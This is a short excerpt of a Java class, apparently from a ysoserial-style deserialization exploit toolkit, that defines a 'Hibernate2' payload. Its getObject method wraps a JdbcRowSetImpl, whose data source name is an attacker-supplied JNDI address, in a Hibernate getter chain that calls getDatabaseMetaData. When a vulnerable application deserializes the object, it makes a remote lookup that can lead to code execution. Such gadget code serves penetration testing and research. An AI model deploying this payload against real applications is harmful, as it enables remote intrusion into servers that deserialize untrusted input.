...
public class Hibernate2 implements ObjectPayload<Object>, DynamicDependencies {
    ...
    public static String[] getDependencies () {
        return dogeser.payloads.Hibernate1.getDependencies();
    }

    public Object getObject ( String command ) throws Exception {
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(command);
        return dogeser.payloads.Hibernate1.makeCaller(rs, Hibernate1.makeGetter(rs.getClass(), "getDatabaseMetaData") );
    }
